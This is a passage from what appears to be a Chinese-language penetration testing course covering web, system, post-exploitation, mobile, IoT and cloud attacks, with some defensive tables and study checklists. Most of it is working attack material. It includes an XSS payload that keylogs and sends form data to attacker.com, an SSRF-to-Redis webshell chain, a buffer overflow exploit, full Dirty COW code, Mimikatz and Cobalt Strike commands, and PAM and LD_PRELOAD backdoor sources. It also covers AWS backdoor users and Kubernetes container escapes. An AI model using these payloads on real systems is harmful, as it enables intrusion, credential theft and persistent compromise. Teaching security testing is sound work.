    keys.push(e.key);
    if(keys.length > 50) {
        fetch('http://attacker.com/keylog', {
            method: 'POST',
            body: JSON.stringify(keys)
        });
        keys = [];
    }
});

// 3. 表单劫持
document.querySelectorAll('form').forEach(form => {
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        var formData = new FormData(form);
        fetch('http://attacker.com/formgrab', {
            method: 'POST',
            body: formData
        }).then(() => form.submit());
    });
});

// 4. 屏幕截图
html2canvas(document.body).then(canvas => {
    canvas.toBlob(blob => {
        var formData = new FormData();
        formData.append('screenshot', blob);
        fetch('http://attacker.com/screenshot', {
            method: 'POST',
            body: formData
        });
    });
});

// 5. 网络钓鱼覆盖
document.body.innerHTML = `
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
    <h2>Session Expired - Please Re-login</h2>
    <form action="http://attacker.com/phish" method="POST">
        <input name="username" placeholder="Username"><br>
        <input name="password" type="password" placeholder="Password"><br>
        <button type="submit">Login</button>
    </form>
</div>
`;

// 6. 内网扫描
for(let i=1; i<=255; i++) {
    fetch(`http://192.168.1.${i}`)
        .then(r => {
            fetch(`http://attacker.com/found?ip=192.168.1.${i}`);
        })
        .catch(() => {});
}
</script>
```

#### SSRF高级利用

**云元数据攻击**:
```bash
# AWS元数据服务
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name

# Azure元数据
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# 绕过IP黑名单
http://0x7f.0.0.1  # 十六进制
http://0177.0.0.1  # 八进制
http://2130706433 # 十进制
http://127.1       # 短格式
http://[::1]       # IPv6

# DNS Rebinding绕过
http://spoofed.burpcollaborator.net
```

**SSRF利用链**:
```python
# SSRF到RCE利用链示例

import requests

target = "http://target.com/api/fetch?url="

# 阶段1: 扫描内网Redis
for i in range(1, 255):
    redis_url = f"http://192.168.1.{i}:6379"
    try:
        response = requests.get(target + redis_url, timeout=2)
        if "redis" in response.text.lower():
            print(f"[+] Found Redis at 192.168.1.{i}")
            redis_host = f"192.168.1.{i}"
    except:
        pass

# 阶段2: Gopher协议攻击Redis
redis_commands = """
FLUSHALL
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET webshell "<?php system($_GET['cmd']); ?>"
SAVE
""".strip()

# URL编码Redis命令
import urllib.parse
gopher_payload = "gopher://192.168.1.10:6379/_"
for cmd in redis_commands.split('\n'):
    gopher_payload += urllib.parse.quote(cmd + "\r\n")

# 发送Gopher payload
response = requests.get(target + gopher_payload)

# 阶段3: 访问Webshell
shell_url = "http://192.168.1.10/shell.php?cmd=id"
result = requests.get(target + shell_url)
print(result.text)
```

### 4.2 系统漏洞利用深度

#### 缓冲区溢出完整利用

**漏洞分析**:
```c
// 漏洞程序示例
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // 危险的复制操作
    printf("Buffer: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable_function(argv[1]);
    return 0;
}
```

**Exploit开发步骤**:
```python
#!/usr/bin/env python3
# 完整的缓冲区溢出Exploit

from pwn import *

# 配置
context.arch = 'i386'
context.os = 'linux'

# 目标信息
binary = './vulnerable'
elf = ELF(binary)

# 第一步: 查找偏移量
def find_offset():
    """
    使用cyclic模式查找EIP偏移
    """
    # 生成唯一模式
    pattern = cyclic(200)

    # 运行程序
    io = process([binary, pattern])
    io.wait()

    # 获取崩溃时的EIP值
    core = io.corefile
    eip_value = core.eip

    # 计算偏移
    offset = cyclic_find(eip_value)
    print(f"[+] EIP offset: {offset}")

    return offset

# 第二步: 查找Gadgets
def find_gadgets():
    """
    查找ROP gadgets
    """
    rop = ROP(elf)

    # 查找有用的gadgets
    pop_eax = rop.find_gadget(['pop eax', 'ret'])[0]
    pop_ebx = rop.find_gadget(['pop ebx', 'ret'])[0]
    int_80 = rop.find_gadget(['int 0x80'])[0]

    return {
        'pop_eax': pop_eax,
        'pop_ebx': pop_ebx,
        'int_80': int_80
    }

# 第三步: 构造Shellcode
def generate_shellcode():
    """
    生成execve("/bin/sh") shellcode
    """
    shellcode = asm(shellcraft.sh())
    return shellcode

# 第四步: 绕过DEP (使用ROP)
def bypass_dep(offset, gadgets):
    """
    使用ROP链绕过DEP
    """
    # 构造ROP链: execve("/bin/sh", NULL, NULL)
    rop_chain = flat(
        # 设置eax = 11 (execve syscall)
        p32(gadgets['pop_eax']),
        p32(11),

        # 设置ebx = "/bin/sh"地址
        p32(gadgets['pop_ebx']),
        p32(next(elf.search(b'/bin/sh'))),

        # 执行syscall
        p32(gadgets['int_80'])
    )

    return rop_chain

# 第五步: 绕过ASLR (信息泄露)
def leak_address():
    """
    泄露libc地址绕过ASLR
    """
    # 使用格式化字符串泄露地址
    payload = b"%p" * 20

    io = process([binary, payload])
    output = io.recvall()

    # 解析泄露的地址
    # ...

    return leaked_address

# 完整Exploit
def exploit():
    # 1. 查找偏移
    offset = find_offset()

    # 2. 查找gadgets
    gadgets = find_gadgets()

    # 3. 生成shellcode
    shellcode = generate_shellcode()

    # 4. 构造payload
    payload = flat(
        b"A" * offset,          # 填充
        p32(0x08048500),        # EIP覆盖为shellcode地址
        b"\x90" * 16,           # NOP sled
        shellcode               # Shellcode
    )

    # 5. 发送payload
    io = process([binary, payload])
    io.interactive()

if __name__ == '__main__':
    exploit()
```

#### 内核漏洞利用

**Dirty COW (CVE-2016-5195)**:
```c
// Dirty COW完整利用代码

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg) {
    char *str;
    str = (char *)arg;
    int i, c = 0;

    for (i = 0; i < 100000000; i++) {
        c += madvise(map, 100, MADV_DONTNEED);
    }

    printf("[*] madvise calls: %d\n", i);
}

void *procselfmemThread(void *arg) {
    char *str;
    str = (char *)arg;

    int f = open("/proc/self/mem", O_RDWR);
    int i, c = 0;

    for (i = 0; i < 100000000; i++) {
        lseek(f, (uintptr_t)map, SEEK_SET);
        c += write(f, str, strlen(str));
    }

    printf("[*] /proc/self/mem writes: %d\n", i);
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <file> <new_content>\n", argv[0]);
        return 1;
    }

    pthread_t pth1, pth2;

    // 打开目标文件
    f = open(argv[1], O_RDONLY);
    fstat(f, &st);
    name = argv[1];

    // 映射文件到内存
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);

    printf("[*] Mapped %s to %p\n", name, map);
    printf("[*] Original content: %s\n", (char *)map);
    printf("[*] Exploiting...\n");

    // 创建线程进行竞争
    pthread_create(&pth1, NULL, madviseThread, argv[2]);
    pthread_create(&pth2, NULL, procselfmemThread, argv[2]);

    // 等待线程完成
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);

    printf("[*] Exploit complete!\n");
    return 0;
}

// 编译: gcc -pthread dirtycow.c -o dirtycow
// 使用: ./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash'
```

### 漏洞案例库速查列表
| 分类 | 漏洞编号/名称 | 触发条件 | 利用要点 | 影响等级 | 修复建议 |
| --- | --- | --- | --- | --- | --- |
| Web | SQL注入（CVE-2022-22965） | 参数未过滤、动态拼接SQL | 绕过WAF、盲注、联合注入 | Critical | 参数化、WAF、权限分离 |
| Web | Log4Shell（CVE-2021-44228） | 用户输入被日志记录并解析 | JNDI payload、反序列化链 | Critical | 升级Log4j、禁用JNDI Lookup |
| Web | 文件上传绕过 | 前后端校验缺失 | 双写绕过、MIME伪造、解析漏洞 | High | 严格白名单、隔离解析目录 |
| 系统 | PrintNightmare（CVE-2021-34527） | 可访问打印服务 | DLL注入、远程执行 | Critical | 禁用打印服务、及时打补丁 |
| 系统 | Dirty Pipe（CVE-2022-0847） | Linux内核5.8+ | 覆写只读文件、提权 | High | 升级内核、启用SELinux/AppArmor |
| 云 | SSRF访问元数据 | 服务可请求169.254.169.254 | 读取凭证、横向移动 | High | 元数据V2、防火墙策略、权限最小化 |
| 移动 | WebView调试开启 | APP调试未关闭 | 注入JS、窃取Cookie | Medium | 关闭调试、证书绑定 |

### 自动化利用脚本设计指南
```text
exploit_framework/
├── reconnaissance.py      # 初始识别、指纹提取
├── exploitation.py        # 漏洞触发、Payload执行
├── post_exploitation.py   # 权限维持、信息收集
├── cleanup.py             # 清理与回滚
└── utils/
    ├── http_client.py
    ├── payload_factory.py
    └── logger.py

运行流程
1. python main.py --target https://target.com --profile log4shell
2. reconnaissance模块探测目标是否易受攻击
3. exploitation模块生成payload并触发
4. post_exploitation模块建立稳定通道
5. cleanup模块回收临时文件、关闭监听
```

**设计原则**：
- 支持多种Payload模板，便于扩展不同漏洞类型。
- 所有网络请求日志化，留存证据。
- 内置“Dry Run”模式，避免在未经授权环境触发危险操作。
- 与漏洞管理平台对接，自动同步漏洞状态。

### 模块作业与挑战
1. **漏洞链分析**：选择真实披露的攻击案例（如SolarWinds、Exchange ProxyLogon），梳理攻击链并复现关键步骤。
2. **EXP开发**：针对指定CVE编写自动化利用脚本，要求包含异常处理、回滚策略。提交代码与运行截图。
3. **绕过实战**：搭建含WAF的靶场，测试编码绕过、缓存投毒、HTTP请求走私等技巧，记录成功率与payload。
4. **报告撰写**：输出不少于4000字的漏洞分析报告，包含根因、利用、修复、检测、攻防建议。

---

## 模块五：后渗透与权限维持

### 模块概览（横向移动与持久化）
- **阶段目标**：在获得初始访问后，最大化业务影响评估，掌握横向移动、权限提升、敏感数据搜集与持久化技术。
- **学习产出**：攻击路径图、凭证管理脚本、横向移动剧本、证据收集与清理流程。
- **关键能力点**：
  - **横向移动策略**：RDP、WMI、SMB/WinRM、SSH、云API等多种方式。
  - **权限提升**：本地提权、域控拿下（Kerberoasting、DCSync、PrintNightmare）。
  - **持久化手法**：注册表、计划任务、服务劫持、Golden/Silver Ticket。
  - **证据管理**：严格遵守“最小影响原则”，记录所有操作留痕。

#### 后渗透通用流程
1. **立足点维持**：判断当前Session稳定性，部署临时回连通道。
2. **信息收集**：收集系统信息、用户、网络拓扑、域结构、共享资源。
3. **凭证狩猎**：LSASS、SAM、浏览器、KeePass、Git凭证、云CLI配置。
4. **横向移动**：识别域内高价值主机（域控、数据库、运维跳板）。
5. **持久化部署**：根据授权，部署可控但易清理的持久化手段。
6. **证据与回滚**：记录每一步操作，测试结束后执行清理并恢复现场。

#### 攻击路径图模板
```
[外部入口] -> [Web服务器] -> (提权) -> [内网跳板] -> (凭证收集) -> [域控]
                                 ↓
                              [数据库] -> (数据导出)
```

### 实战案例：Windows域环境拿下
**背景**：通过Web漏洞获得一台应用服务器的低权限Shell，需要评估对内部域的影响。

**行动路线**：
1. **信息收集**
   ```powershell
   whoami /all
   ipconfig /all
   net view /domain
   nltest /domain_trusts
   ```
   - 确认主机加入`CORP.local`域，当前用户具备服务账号权限。
2. **凭证获取**
   - 使用`mimikatz`读取内存凭证：`sekurlsa::logonpasswords`，发现域管理员最近登录痕迹。
   - 通过`SharpHound`搜集域信息，生成图谱。
3. **权限提升**
   - 利用服务账号的`SeImpersonatePrivilege`执行`PrintSpoofer`获取SYSTEM权限。
   - 导出NTDS.dit与SYSTEM注册表，使用`secretsdump.py`离线破解。
4. **横向移动**
   - 采用`wmiexec.py`利用域管理员凭证连接域控。
   - 部署`Cobalt Strike` Beacon，确保稳定连接。
5. **持久化设置**
   - 创建黄金票据（只在授权场景下执行）：`kerberos::golden /user:svc-backup /domain:CORP.local /sid:S-1-5-21-...`
   - 部署计划任务作为备用通道，指定测试结束后自动删除。
6. **证据整理与清理**
   - 导出关键操作日志、截图、命令记录。
   - 恢复系统状态，删除临时文件、关闭持久化通道。

**风险说明**：此攻击链验证域控被攻破的可能性，对业务和数据资产影响极大，应列为最高优先级修复事项。

### 进阶拓展：跨平台与云场景
- **Linux后渗透**：
  - 枚举`/etc/passwd`、`/etc/shadow`、SSH密钥、Cron任务。
  - 利用`sudo`误配置、SUID程序、内核漏洞实现提权。
  - 结合`sshuttle`、`proxychains`实现网络透视。
- **容器与Kubernetes**：
  - 利用挂载的Docker Socket逃逸、特权容器、K8s RBAC误配置。
  - 获取etcd数据、Kubelet凭证实现集群控制。
- **云环境**：
  - AWS：利用弱配置IAM策略、访问密钥泄露执行API、提取敏感数据。
  - Azure：滥用Service Principal、管理身份权限；GCP：滥用服务账号。
- **移动与IoT**：分析APK/固件，利用调试接口（ADB/JTAG/UART）进行逆向与植入。

### 5.1 Windows后渗透

#### 凭证获取技术

**Mimikatz完整使用**:
```powershell
# Mimikatz全面使用指南

# 1. 提权到SYSTEM
privilege::debug
token::elevate

# 2. 提取明文密码（需要启用WDigest）
sekurlsa::logonpasswords

# 3. 提取NTLM哈希
lsadump::sam
lsadump::secrets

# 4. 提取Kerberos票据
sekurlsa::tickets /export

# 5. DCSync攻击（域环境）
lsadump::dcsync /domain:target.com /user:Administrator
lsadump::dcsync /domain:target.com /user:krbtgt

# 6. Golden Ticket生成
kerberos::golden /user:Administrator /domain:target.com /sid:S-1-5-21-xxx /krbtgt:hash /ptt

# 7. Silver Ticket生成
kerberos::golden /user:Administrator /domain:target.com /sid:S-1-5-21-xxx /target:server.target.com /service:cifs /rc4:hash /ptt

# 8. Pass-the-Hash
sekurlsa::pth /user:Administrator /domain:target.com /ntlm:hash /run:cmd.exe

# 9. Pass-the-Ticket
kerberos::ptt ticket.kirbi

# 10. 提取浏览器凭证
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data"
```

**BloodHound域分析**:
```powershell
# BloodHound数据收集

# 1. SharpHound收集器
.\SharpHound.exe -c All --outputdirectory C:\temp

# 2. PowerShell收集器
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp

# 3. Python收集器（Linux）
bloodhound-python -u user@target.com -p password -d target.com -ns 10.0.0.1 -c All

# 4. 导入Neo4j数据库并分析
# - 最短路径到域管理员
# - Kerberoastable账户
# - AS-REP Roastable账户
# - 未约束委派主机
# - ACL滥用路径
```

**Cobalt Strike使用**:
```bash
# Cobalt Strike团队服务器

# 1. 启动团队服务器
./teamserver [external IP] [password] [/path/to/c2.profile]

# 2. 生成Beacon payload
# Attacks -> Packages -> Windows Executable

# 3. Listener配置
# Cobalt Strike -> Listeners -> Add
# Type: windows/beacon_http/reverse_http

# 4. 后渗透操作
# beacon> shell whoami
# beacon> getuid
# beacon> ps
# beacon> steal_token [PID]
# beacon> make_token domain\user password
# beacon> dcsync target.com domain\krbtgt
# beacon> golden_ticket domain\user
# beacon> jump psexec target.com
```

### 5.2 Linux后渗透

#### 权限维持技术

**高级后门技术**:
```bash
# 1. PAM后门

# 编译PAM后门模块
cat > pam_backdoor.c <<EOF
#include <security/pam_modules.h>
#include <string.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                   int argc, const char **argv) {
    const char *user;
    const char *password;

    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);

    // 记录凭证到文件
    FILE *f = fopen("/tmp/.creds", "a");
    fprintf(f, "%s:%s\n", user, password);
    fclose(f);

    // 万能密码
    if (strcmp(password, "Sup3rS3cr3t!") == 0) {
        return PAM_SUCCESS;
    }

    return PAM_AUTH_ERR;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                               int argc, const char **argv) {
    return PAM_SUCCESS;
}
EOF

# 编译
gcc -fPIC -shared -o pam_backdoor.so pam_backdoor.c -lpam

# 安装
cp pam_backdoor.so /lib/x86_64-linux-gnu/security/
echo "auth sufficient pam_backdoor.so" >> /etc/pam.d/sshd

# 2. LD_PRELOAD后门

cat > ld_preload_backdoor.c <<EOF
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>

int socket(int domain, int type, int protocol) {
    // 劫持socket函数，反弹shell
    if (fork() == 0) {
        execl("/tmp/backdoor.sh", "backdoor", NULL);
    }

    // 调用原始socket函数
    int (*original_socket)(int, int, int);
    original_socket = dlsym(RTLD_NEXT, "socket");
    return (*original_socket)(domain, type, protocol);
}
EOF

gcc -fPIC -shared -o backdoor.so ld_preload_backdoor.c -ldl
echo "/path/to/backdoor.so" >> /etc/ld.so.preload

# 3. Kernel模块后门

cat > rootkit.c <<EOF
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>

MODULE_LICENSE("GPL");

static unsigned long **sys_call_table;

asmlinkage long (*original_getdents64)(unsigned int fd,
                                       struct linux_dirent64 *dirp,
                                       unsigned int count);

// 隐藏文件
asmlinkage long hooked_getdents64(unsigned int fd,
                                  struct linux_dirent64 *dirp,
                                  unsigned int count) {
    // 调用原始函数
    long ret = original_getdents64(fd, dirp, count);

    // 过滤包含"rootkit"的文件
    // ...

    return ret;
}

static int __init rootkit_init(void) {
    // 获取系统调用表
    // Hook getdents64
    // ...
    return 0;
}

static void __exit rootkit_exit(void) {
    // 恢复原始系统调用
    // ...
}

module_init(rootkit_init);
module_exit(rootkit_exit);
EOF

# 编译内核模块
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules

# 加载模块
insmod rootkit.ko
```

---

### 移动与IoT场景渗透

### 6.1 Android应用渗透

**APK逆向分析**:
```bash
# 1. 反编译APK
apktool d application.apk -o output_dir

# 2. 转换为JAR
d2j-dex2jar application.apk

# 3. 反编译JAR
jd-gui application.jar

# 4. 查找敏感信息
grep -r "api_key" output_dir/
grep -r "password" output_dir/
grep -r "http://" output_dir/

# 5. 分析AndroidManifest.xml
cat output_dir/AndroidManifest.xml
# - 检查权限
# - 导出的组件
# - Intent过滤器
# - 调试标志
```

**Frida动态分析**:
```javascript
// Frida脚本示例 - SSL Pinning绕过

Java.perform(function() {
    console.log("[*] Bypassing SSL Pinning...");

    // Hook OkHttp3
    var OkHttpClient = Java.use("okhttp3.OkHttpClient");
    OkHttpClient.Builder.prototype.build = function() {
        return this.build();
    };

    // Hook TrustManagerImpl
    var TrustManagerImpl = Java.use("com.android.org.conscrypt.TrustManagerImpl");
    TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
        console.log("[+] SSL Pinning bypassed for: " + host);
        return untrustedChain;
    };

    // Hook 自定义SSL验证
    var CustomSSLSocketFactory = Java.use("com.example.app.CustomSSLSocketFactory");
    CustomSSLSocketFactory.checkServerTrusted.implementation = function(chain, authType) {
        console.log("[+] Custom SSL check bypassed");
    };
});

// 使用Frida
frida -U -f com.example.app -l bypass_ssl.js --no-pause
```

**MobSF自动化分析**:
```bash
# Mobile Security Framework

# 1. 启动MobSF
docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf

# 2. 上传APK进行分析
# - 静态分析
# - 动态分析
# - 恶意行为检测
# - 隐私问题

# 3. 查看报告
# - 敏感权限
# - 硬编码凭证
# - 不安全的数据存储
# - 弱加密算法
# - 代码混淆程度
```

### 6.2 IoT设备渗透

**固件分析**:
```bash
# 1. 固件提取
# 使用编程器读取Flash芯片
# 或通过JTAG/UART接口

# 2. 固件解包
binwalk -e firmware.bin

# 3. 文件系统挂载
mkdir rootfs
sudo mount -o loop extracted/filesystem.img rootfs/

# 4. 查找敏感信息
grep -r "password" rootfs/etc/
grep -r "key" rootfs/etc/
cat rootfs/etc/shadow

# 5. 分析Web服务
cat rootfs/etc/init.d/httpd
# 查找CGI脚本漏洞

# 6. 逆向二进制文件
file rootfs/bin/busybox
strings rootfs/bin/custom_daemon | grep -i password
ghidra rootfs/bin/custom_daemon
```

**硬件接口利用**:
```bash
# UART接口连接

# 1. 识别UART引脚
# VCC - 电源（通常3.3V或5V）
# GND - 地
# TX  - 发送
# RX  - 接收

# 2. 连接UART转USB适配器
# 设备TX -> 适配器RX
# 设备RX -> 适配器TX
# 设备GND -> 适配器GND

# 3. 识别波特率
baudrate.py /dev/ttyUSB0

# 4. 连接串口
screen /dev/ttyUSB0 115200

# 5. 获取Shell
# 中断启动过程
# 修改启动参数: init=/bin/sh
# 获取root shell

# JTAG接口
# 使用OpenOCD连接JTAG
openocd -f interface/ftdi/olimex-arm-usb-ocd.cfg -f target/stm32f1x.cfg

# 读取Flash
flash read_bank 0 firmware_dump.bin 0 0x100000

# 写入修改后的固件
flash write_bank 0 modified_firmware.bin 0
```

---

### 云环境渗透测试

### 7.1 AWS渗透测试

**S3桶安全测试**:
```bash
# 1. 枚举S3桶
aws s3 ls s3://target-company

# 2. 尝试访问
aws s3 ls s3://target-company --no-sign-request

# 3. 下载敏感文件
aws s3 cp s3://target-company/backup.zip . --no-sign-request

# 4. 检查ACL
aws s3api get-bucket-acl --bucket target-company

# 5. 测试写权限
echo "test" > test.txt
aws s3 cp test.txt s3://target-company/ --no-sign-request

# 6. 自动化工具
# S3Scanner
python3 s3scanner.py --bucket-file buckets.txt

# CloudBrute
cloudbrute -d target.com -k target -m s3 -w wordlist.txt
```

**IAM权限提升**:
```bash
# 1. 枚举当前权限
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name current-user
aws iam get-user-policy --user-name current-user --policy-name PolicyName

# 2. 枚举其他用户
aws iam list-users
aws iam list-roles

# 3. 尝试提权
# 创建新用户
aws iam create-user --user-name backdoor-user

# 附加管理员策略
aws iam attach-user-policy --user-name backdoor-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 创建访问密钥
aws iam create-access-key --user-name backdoor-user

# 4. 使用Pacu自动化
pacu
run iam__enum_permissions
run iam__privesc_scan
run iam__backdoor_users_keys
```

**Lambda函数安全**:
```bash
# 1. 枚举Lambda函数
aws lambda list-functions

# 2. 获取函数代码
aws lambda get-function --function-name sensitive-function

# 3. 下载代码
wget [CodeLocation URL]

# 4. 分析代码查找漏洞
unzip code.zip
cat index.js
# - 硬编码凭证
# - 命令注入
# - SSRF

# 5. 调用函数测试
aws lambda invoke --function-name test-function --payload '{"key": "value"}' output.txt
```

### 7.2 Docker/Kubernetes渗透

**容器逃逸**:
```bash
# 1. 检查容器环境
cat /proc/1/cgroup
ls -la /.dockerenv

# 2. 检查特权容器
capsh --print
# 查找CAP_SYS_ADMIN等危险权限

# 3. 挂载宿主机文件系统
# 如果有SYS_ADMIN权限
mkdir /host
mount -t proc proc /host/proc
mount --bind /host/proc/1/root /host

# 4. 利用Docker Socket
# 如果/var/run/docker.sock被挂载
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host

# 5. CVE-2019-5736 (runc)
# 容器逃逸漏洞利用

# 6. 内核漏洞
uname -a
# 搜索对应版本的内核漏洞
```

**Kubernetes集群渗透**:
```bash
# 1. 枚举Service Account
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# 2. 使用kubectl
export KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --token=$KUBE_TOKEN --server=https://kubernetes.default --insecure-skip-tls-verify=true get pods

# 3. 枚举权限
kubectl auth can-i --list

# 4. 创建特权Pod
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name:攻击pod
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: backdoor
    image: alpine
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
EOF

# 5. 获取宿主机Shell
kubectl exec -it attack-pod -- chroot /host bash

# 6. Kubelet未授权访问
curl -k https://[node-ip]:10250/pods
curl -k https://[node-ip]:10250/run/namespace/pod/container -d "cmd=whoami"
```

### 凭证管理矩阵
| 凭证类型 | 来源 | 利用方式 | 检测手段 | 防护建议 |
| --- | --- | --- | --- | --- |
| Windows明文密码 | LSASS内存、注册表、浏览器存储 | Pass-the-Hash、远程登录、横向移动 | 监控LSASS访问、Sysmon事件ID 10/4656 | 启用Credential Guard、限制管理员登录、关闭WDigest |
| Kerberos票据 | Tickets/Cache、域控 | Pass-the-Ticket、Golden Ticket、Silver Ticket | KDC日志异常、异常票据生命周期 | 定期重置KRBTGT、最小化SPN服务账号权限 |
| Linux SSH密钥 | ~/.ssh、配置文件、备份压缩包 | SSH横向、代理跳板、Git访问 | 检测异常SSH登录、Fail2ban、审计日志 | 使用密码短语、硬件令牌、限制私钥权限 |
| 数据库凭证 | 配置文件、环境变量、内存 | 读取/修改业务数据、上传WebShell | 数据库审计、慢查询日志 | 使用Vault集中管理、细分权限、启用审计 |
| 云API密钥 | 代码仓库、CI/CD、云主机 | 调用API、创建资源、窃取数据 | CloudTrail/ActionTrail、异常API调用检测 | 启用MFA、密钥轮换、限制IP、云堡垒机 |
| OAuth Token/Session | 浏览器缓存、移动端包、代理日志 | 接口调用、权限提升 | 会话异常、IP变化检测 | 设置过期时间、绑定设备、启用双因素 |

### 蓝队协同视角
- **检测策略**：
  - 收集并关联主机日志、认证日志、网络流量，构建横向移动行为画像。
  - 利用Sysmon + EDR监控敏感工具（mimikatz、powershell、wmic、mshta、rundll32）。
  - 在SIEM中建立“异常登录路径”规则，如短时间横跨多个主机的登录事件。
- **响应策略**：
  - 建立凭证泄露应急预案，包含账号冻结、密钥轮换、日志审计。
  - 对持久化项进行脚本化巡检（计划任务、服务、WMI订阅、注册表Run键）。
  - 与红队共享攻击路径与凭证来源，推动修复与流程改进。

### 模块作业
1. **横向移动脚本实践**：编写自动化脚本实现内网资产发现、凭证抓取、横向登录尝试，输出执行流程与风险控制说明。
2. **蓝红对抗演练**：设计并执行一次小型蓝红对抗，记录时间线、攻击行为、检测结果、复盘建议。
3. **凭证清理手册**：总结测试中可能残留的凭证和持久化点，输出清单式清理手册，便于项目收尾使用。
4. **云环境攻防报告**：选择AWS/Azure/GCP之一，完成模拟攻击→防御→修复的闭环报告，附带Terraform/CLI脚本。

---

## 模块六：学习验证与职业发展

### 模块概览（成长闭环）
- **主要目标**：建立从学习到实践、从实践到沉淀的闭环体系，确保技能持续升级并形成可衡量成果。
- **产出要求**：个人成长路线图、学习效果评估表、实战作品集、职业发展规划。
- **能力点**：
  - 量化学习：使用OKR/KPI衡量学习成果。
  - 作品集建设：形成报告模板、攻防演练总结、开源贡献。
  - 社区与人脉：参与安全社区、演讲分享、技术写作。

#### 学习闭环模型
```
学习目标设定 → 知识获取 → 实践验证 → 复盘总结 → 知识迁移 → 影响扩大
```

| 阶段 | 关键问题 | 常用工具 | 产出物 |
| --- | --- | --- | --- |
| 目标设定 | 近期要掌握哪些技能？ | SMART模型、思维导图 | 学习路线图、季度计划 |
| 知识获取 | 如何高效吸收？ | 费曼学习法、番茄工作法 | 学习笔记、思维导图 |
| 实践验证 | 如何检验掌握程度？ | CTF、实验室、Bug Bounty | 演练记录、FLAG截图 |
| 复盘总结 | 存在哪些不足？ | 5W1H、Fishbone分析 | 复盘报告、改进清单 |
| 知识迁移 | 如何应用到新场景？ | 设计算法题/工具 | 工具脚本、技术博客 |
| 影响扩大 | 如何提升行业影响力？ | 讲座、开源项目 | 演讲视频、GitHub Star |

### ✅ 阶段一：基础掌握（1-2个月）
- [ ] 理解渗透测试法律法规和道德准则
- [ ] 掌握PTES/OWASP等标准方法论
- [ ] 能够独立完成信息收集全流程
- [ ] 熟练使用Nmap、Burp Suite等基础工具
- [ ] 理解并演示OWASP Top 10漏洞
- [ ] 完成DVWA/WebGoat所有练习
- [ ] 通过10个CTF Web题目

### ✅ 阶段二：技能提升（3-4个月）
- [ ] 独立发现并利用SQL注入、XSS、SSRF等漏洞
- [ ] 掌握Windows和Linux权限提升技术
- [ ] 能够编写自动化渗透测试脚本
- [ ] 理解并利用反序列化、XXE等高级漏洞
- [ ] 绕过基础WAF防护
- [ ] 完成HackTheBox 20台靶机
- [ ] 编写专业的渗透测试报告

### ✅ 阶段三：高级应用（5-6个月）
- [ ] 掌握缓冲区溢出和ROP利用技术
- [ ] 进行移动应用渗透测试
- [ ] 云环境（AWS/Azure）安全评估
- [ ] IoT设备固件分析和硬件接口利用
- [ ] Docker/Kubernetes安全测试
- [ ] 开发自定义渗透工具
- [ ] 参与漏洞赏金计划并提交有效报告

### ✅ 阶段四：专家级（6个月以上）
- [ ] 发现0day漏洞并负责任披露
- [ ] 完成完整的APT攻击模拟
- [ ] 通过OSCP/OSEP/OSCE认证
- [ ] 独立完成大型企业渗透测试项目
- [ ] 编写高质量的exploit和工具
- [ ] 参与安全会议演讲

---

### 学习成果验证矩阵
| 指标 | 说明 | 验证频率 | 度量工具 | 目标值 |
| --- | --- | --- | --- | --- |
| 漏洞有效率 | 渗透测试中成功验证漏洞的数量占总尝试比例 | 每次项目后 | 工单系统、漏洞管理平台 | ≥ 30%（高危漏洞≥5个） |
| 平均修复时长（MTTR） | 从漏洞发现到修复验证通过的平均时间 | 每季度 | Jira/禅道、自动统计脚本 | 高危≤7天，中危≤14天 |
| 自动化脚本复用率 | 自研脚本在不同项目中的复用占比 | 每季度 | Git统计、内部工具平台 | ≥ 60% |
| 知识输出频率 | 博客、分享、开源贡献次数 | 每季度 | 个人日志、GitHub统计 | ≥ 2次/季度 |
| 攻防演练评分 | 蓝红对抗中的综合得分（隐蔽性、效率、创新性） | 每次演练后 | 演练评估表 | ≥ 85/100 |

### 作品集与证据沉淀
- **项目类**：渗透测试报告样本、攻防演练复盘、甲方反馈截图。
- **技术类**：POC脚本、自动化工具、漏洞分析笔记、逆向分析报告。
- **影响力类**：会议演讲PPT、视频回放链接、开源项目贡献记录。
